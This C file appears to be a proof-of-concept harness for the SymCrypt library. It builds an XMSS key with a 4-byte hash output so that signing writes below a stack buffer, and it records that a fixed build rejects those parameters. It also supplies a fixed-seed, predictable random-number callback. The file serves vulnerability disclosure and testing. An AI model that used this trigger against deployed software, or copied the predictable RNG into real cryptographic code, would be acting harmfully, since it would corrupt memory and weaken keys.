/*
 * XmssOverrun — real-code PoC against microsoft/SymCrypt (HEAD 286762b).
 *
 * SymCryptXmssSetParams accepts a custom XMSS parameter set with a hash
 * output length n (cbHashOutput) as small as 1 byte (the only validation is
 * "nonzero and <= hash result size"). SymCryptXmssRandomizedHash then writes
 * the 8-byte sign index at &idxBuf[cbHashOutput - sizeof(Idx)] on a 64-byte
 * stack buffer — for n < 8 the index is negative and the write lands BELOW
 * the buffer, corrupting the adjacent SYMCRYPT_HASH_STATE / stack canary.
 *
 * This harness creates a key with n=4 and signs a message. On the vulnerable
 * build the sign path corrupts the stack (abort / wrong output); with the
 * fixed SetParams validation (reject n < 8) the same call returns
 * SYMCRYPT_INVALID_ARGUMENT.
 */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "symcrypt.h"

SYMCRYPT_ENVIRONMENT_GENERIC

SYMCRYPT_ERROR
SYMCRYPT_CALL
SymCryptCallbackRandom(PBYTE pbBuffer, SIZE_T cbBuffer)
{
    static UINT64 state = 0x1234567890ABCDEFULL;
    for (SIZE_T i = 0; i < cbBuffer; i++)
    {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        pbBuffer[i] = (BYTE)(state & 0xFF);
    }
    return SYMCRYPT_NO_ERROR;
}

PVOID SYMCRYPT_CALL SymCryptCallbackAlloc(SIZE_T nBytes) { return malloc(nBytes); }
VOID SYMCRYPT_CALL SymCryptCallbackFree(PVOID pMem) { free(pMem); }

int main(void)
{
    SYMCRYPT_ERROR scError;

    SymCryptInit();

    /* custom XMSS parameter set with n = 4 (accepted by SetParams at HEAD) */
    SYMCRYPT_XMSS_PARAMS params;
    SymCryptWipeKnownSize(&params, sizeof(params));

    scError = SymCryptXmssSetParams(
        &params,
        1,                          /* id (custom) */
        SymCryptSha256Algorithm,    /* pHash */
        4,                          /* cbHashOutput = 4  <- n < 8 */
        4,                          /* nWinternitzWidth */
        10,                         /* nTotalTreeHeight */
        1,                          /* nLayers (single tree) */
        3);                         /* cbPrefix */
    printf("[1] SymCryptXmssSetParams(n=4, h=10, w=4) -> 0x%08x\n", scError);
    fflush(stdout);
    if (scError != SYMCRYPT_NO_ERROR)
    {
        return 0;
    }

    PSYMCRYPT_XMSS_KEY pKey = SymCryptXmsskeyAllocate(&params, 0);
    if (pKey == NULL)
    {
        printf("[2] key allocation failed\n");
        return 1;
    }

    scError = SymCryptXmsskeyGenerate(pKey, 0);
    printf("[3] SymCryptXmsskeyGenerate -> 0x%08x\n", scError);
    fflush(stdout);
    if (scError != SYMCRYPT_NO_ERROR)
    {
        return 0;
    }

    BYTE pbMessage[32];
    BYTE pbSignature[4096];
    SIZE_T cbSignature = SymCryptXmssSizeofSignatureFromParams(&params);
    memset(pbMessage, 0x42, sizeof(pbMessage));
    printf("[4] signature buffer size: %llu bytes\n",
           (unsigned long long)cbSignature);
    fflush(stdout);

    printf("[!] calling SymCryptXmssSign (reaches SymCryptXmssRandomizedHash, n=4)\n");
    fflush(stdout);
    scError = SymCryptXmssSign(pKey, pbMessage, sizeof(pbMessage), 0,
                               pbSignature, cbSignature);
    printf("[5] SymCryptXmssSign -> 0x%08x\n", scError);

    SymCryptXmsskeyFree(pKey);
    return 0;
}
